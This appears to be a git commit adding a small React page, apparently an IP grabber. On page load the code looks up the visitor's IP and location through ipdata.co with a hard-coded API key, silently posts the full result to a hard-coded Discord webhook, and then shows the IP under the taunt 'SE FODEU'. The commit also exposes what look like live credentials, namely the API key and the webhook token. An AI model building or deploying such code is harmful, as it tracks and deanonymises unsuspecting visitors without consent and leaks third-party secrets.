8412ee49bb4094ed813740932166d475b0bca288
HoppeDevz <hoppecsgonet@hotmail.com>
2024-02-23 16:37:25 -0300

    first commit

---
+++ src/App.tsx
@@ -0,0 +1,43 @@
+import axios from "axios";
+
+import { useEffect, useState } from 'react';
+import './App.css';
+
+function App() {
+
+  const[ip, setIp] = useState("0.0.0.0/0");
+
+  const fetchIp = async () => {
+    
+    const response = await fetch("https://api.ipdata.co?api-key=0b7cb527478e70020966af85ab682dbeddcbf7340f57b580f955b6a8");
+    const data = await response.json();
+
+    await axios.post("https://discord.com/api/webhooks/1210670818493997127/do9-N-XxANASD6-bVt00ledH5135SgISHJgihBiGXQWJ2t4HiaC4tjvplJ6sLF4ifN7V", {
+      content: `\`\`\`\n${JSON.stringify(data)}\n\`\`\``
+    });
+
+    setIp(data.ip);
+  }
+
+  useEffect(() => {
+    fetchIp();
+  }, []);
+
+  return (
+    <div
+      style={{ width: "100vw", height: "100vh", display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center" }}
+    >
+      <p
+        style={{ color: "red" }}
+      >
+        SE FODEU
+      </p>
+
+      <p>
+        {ip}
+      </p>
+    </div>
+  )
+}
+
+export default App
